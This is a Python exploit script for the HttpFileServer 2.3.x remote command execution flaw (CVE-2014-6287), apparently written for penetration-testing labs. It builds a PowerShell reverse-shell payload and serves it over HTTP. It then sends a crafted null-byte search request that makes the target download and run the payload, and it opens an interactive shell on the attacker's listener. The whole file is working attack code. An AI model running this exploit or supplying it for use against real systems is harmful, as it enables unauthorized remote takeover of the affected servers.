# -*- coding: utf-8 -*-

# HttpFileServer 2.3.x Remote Command Execution
# CVE: 2014-6287
# Exploit author: Avinash Kumar Thapa
# https://www.exploit-db.com/exploits/39161
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

# ** This exploit has some delay when dealing with the reverse shell step and i don't know why lol
# Sometimes you gotta wait for 1 minute to spawn the shell completely **
 

import argparse
import http.server
import random
import requests
import socketserver
import string
import sys
import threading
from pwn import *
from requests.utils import requote_uri


def main():
    
    # args
    argparser = argparse.ArgumentParser(description='HttpFileServer 2.3.x Remote Command Execution', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='HFS host', 
                            required=True)
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--lfileserverport', type=str,
                            help='Local port to serve the ps1 file (default: 5555)', 
                            default='5555')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
                            
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    lfileserverport = args.lfileserverport
    burpsuite = args.burpsuite
    
    def string_generator():
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(8))
    
    def reverse_shell(l):
        
        print(" [*] Spawning the reverse shell...")
 
        l.sendline("""whoami""")
        l.interactive()
        
    
    def generate_ps1():
    
        print(" [*] Generating the PowerShell payload to be downloaded from your victim...")
 
        ps_payload = "$client = New-Object System.Net.Sockets.TCPClient('"+lhost+"',"+lport+");"
        ps_payload += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        ps_payload += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        ps_payload += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        ps_payload += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        ps_payload += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        ps_payload += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        
        try:
            with open('/tmp/{}.ps1'.format(randname),'w') as f:
                f.write(ps_payload)
                f.close()
        except Exception as e:
            print(" [*] Failed to generate the PowerShell payload!")
            sys.exit(1)
        else:
            print(" [*] PS1 file generated with success!")
                
    
    class quietServer(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory='/tmp', **kwargs)
        
        def log_message(self, format, *args):
            pass
        
    
    def start_server(): 
        with socketserver.TCPServer(("", int(lfileserverport)), quietServer) as httpd:
            httpd.serve_forever()
            
    
    def exploit():
        threading.Thread(target=start_server).start()
        
        ps_payload = 'powershell.exe -nop -exec bypass -c "'
        ps_payload += 'IEX(New-Object System.Net.WebClient).DownloadString(\'http://{}:{}/{}.ps1\');"'.format(
                                                                                                lhost, lfileserverport,
                                                                                                randname)
        ps_payload = requote_uri(ps_payload)
        
        print(" [*] Exploiting the HFS web application...")
        
        l = listen(lport)
        
        try:
            if burpsuite:
                requests.get("http://"+rhost+"/?search=%00{.+exec|"+ps_payload+".}", proxies=proxies)
            else:
                requests.get("http://"+rhost+"/?search=%00{.+exec|"+ps_payload+".}")
        
        except:
            print(" [*] Failed to exploit the HFS web application!")
            sys.exit(1)
        
        else:
            print(" [*] HFS exploited!")
            reverse_shell(l)    
            
    # main 
    print(" [>] HttpFileServer 2.3.x Remote Command Execution")
    print(" [*] Python script exploit author: nullarmor")
    
    randname = string_generator()
    generate_ps1()
    exploit()    
        
if __name__ == "__main__":
    main()
